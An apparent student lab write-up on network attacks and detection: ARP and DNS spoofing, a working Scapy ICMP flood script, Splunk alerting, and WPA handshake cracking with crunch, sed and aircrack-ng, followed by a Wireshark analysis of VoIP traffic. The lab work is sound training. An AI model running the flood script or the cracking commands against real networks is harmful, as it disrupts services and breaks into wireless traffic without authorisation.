### 1. Use the Arp spoof tool to perform the following attacks  

 

## a. Use ARP packets to perform the DNS spoofing attack. Whatever the website the user types, it should navigate to http://testphp.vulnweb.com/login.php as a part of the attack. 

   ```Attacker 10.211.56.4```
   ```Victim 10.211.56.5```


Starting ARPspoofing

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/3ca0a6b0-2cb6-4d2f-9e1b-cca8c41c2e20">

<img width="994" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/6aaf35b1-d2fe-4a6e-b8c9-1af4b02bf752">

DNS spoofing started 
 
<img width="1264" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/63accda4-beff-4d33-a3d9-3aa10d37ee4d">

 <img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/5ed22f6c-c0f8-4856-9686-f94a08538a58">


## b. Use ICMP Packets to perform only DDOS attacks over the victim. 

 ![image](https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/89c1f5d2-9124-4b36-8d05-65e53a5949b9)

![image](https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/e18f5798-923e-4f1d-8cee-9edbf7f36c3c)

from scapy.all import *

# Function to send ICMP packets
def send_icmp_packet(dst_ip):
    icmp_packet = IP(dst=dst_ip)/ICMP()
    send(icmp_packet, loop=True, verbose=False)

# Main function
def main():
    target_ip = input("Enter the target IP address: ")
    while True:
        send_icmp_packet(target_ip)

if __name__ == "__main__":
    main()
 

### 2. Use Splunk to answer the following questions: 

 

## a. Capture these above attacks using Splunk in an active or passive method. 

 Passive Logs

 <img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/a543bbdc-2386-40de-8fef-44ddebd18fd8">


## b. Identify and Analyse the Indicator of Compromise for the attack.  

An Indicator of Compromise (IoC) is any piece of evidence or anomaly that suggests a network intrusion or security breach has occurred. IoCs can take various forms, including:
File Hashes: Hash values of known malicious files or executables found on systems.
IP Addresses: IP addresses associated with malicious activity, such as command and control servers or sources of malicious traffic.
Domain Names: Domain names linked to malicious activities, phishing campaigns, or hosting malicious content.
URLs: URLs used in phishing emails or websites hosting exploit kits or malware payloads.
File Paths: Unusual file paths or directories commonly used by malware for persistence or data exfiltration.
Network Traffic Patterns: Anomalous network traffic, such as unusual spikes in DNS queries, connections to known malicious IP addresses, or unexpected outbound traffic.
System Logs: Suspicious entries in system logs, including failed login attempts, privilege escalations, or unusual system activities.
For DNS Spoofing Attack IOC can be :

DNS Log Analysis and DNS Traffic Analysis
File Hash, Suspicious IP Address and anamoulous Login Activity

## c. Explore and create an Alert for similar attacks in the Future.  

 we should create an alert to monitor such type of events when encountered in future.
<img width="747" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/667f8b65-8161-4efc-a7a8-d34ee45232ec">

After Creating an alert

<img width="933" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/bafb31f9-fd51-4d66-b208-60cd4d3718b1">

first selecting due to which incident the attack is generated
Select Monitoring tool
Create alerts.
Test the alerts
Fine- Tuning the alert
Document the alert rules which are craftes
Continuous Improvement.


 

### 3. Use the given PCAP file to analyse and answer the following questions: 

 

## a. Decrypt the traffic by cracking the password using appropriate tools and techniques. It is a must to mention briefly your method of cracking the password in the documentation. [HINT: password length – 16, Capital letter – 2, numerals – 6, It is a repetition of the same word as 

## [CyberCyber]. 

```We need to create a word list using crunch command``` 
  ## crunch 8 8 -t ,@@@@123 -o temp7.txt

```We will make for 16 character using  concatination command```
## sed "s/^\(.\{8\}\)$/\1\1/" temp7.txt > q.txt

## If we directly crack the password using the cap file it will show unsupported file , so we need to convert the cap file into pcap (used wireshark)

 <img width="648" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/424e6308-6c51-4a56-b3ed-f5bb3ebf8b5f">

 ## Index is 2 only we need to take 2nd handshake.

<img width="921" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/bbf146e6-95ba-4125-8a53-c2d30e9b0c00">

## Processing the password cracking from wordlist 

```aircrack-ng midterm2.pcap -w q.txt```

<img width="882" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/39447639-201e-4ddd-9b49-b3082c4a11e4">


## Password Cracked:

<img width="773" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/12f11367-5fcf-46e2-af1d-7938d76fca7c">


 

## b. Analyse the decrypted traffic using tools to identify the malicious/suspicious activity recorded in the WLAN.  

```Open Wireshark and select the provided CAP file. Then navigate to Edit > Preferences > Protocols > IEEE 802.11 > Decryption Keys > Edit.```

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/a270c337-3223-4b25-907d-96d087af613d">


<img width="912" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/7fd6e717-967b-4919-a153-a00875a3d45c">

<img width="987" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/db788193-3714-41ff-8836-1abc8d7ecbe4">

```on analysing PCAP file, we can get that VOIP call is made through skinny protocol and all details regarding calls.```

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/2b26858b-f0f9-460b-bee8-b9a0a5040651">

## First,  skinny protocol connection is made, after which an RTP protocol connection is made and the VoIP conversation is disconnected.

```skinny protocol```
```Real time transport protocol```

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/bcc3c225-88e6-4944-b0a0-b8fce7c01b4b">

 
